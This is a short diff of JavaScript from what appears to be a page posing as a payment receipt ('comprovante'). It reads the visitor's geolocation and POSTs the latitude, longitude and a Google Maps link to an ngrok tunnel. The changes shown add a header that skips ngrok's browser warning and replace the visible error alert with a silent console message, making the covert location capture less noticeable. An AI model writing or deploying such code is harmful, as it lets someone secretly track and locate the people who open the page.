@@ -41,29 +41,27 @@
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
 
     document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch(" https://b2f7-2804-14c-bba6-8b2e-4849-9ba4-5750-b42c.ngrok-free.app", {
+      fetch("https://b2f7-2804-14c-bba6-8b2e-4849-9ba4-5750-b42c.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json"
+          "Content-Type": "application/json",
+          "ngrok-skip-browser-warning": "true"
         },
         body: JSON.stringify({ latitude, longitude, maps })
       })
         .then(response => response.json())
         .then(data => {
           if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
+            console.log("Localização enviada.");
           }
         })
         .catch(error => {
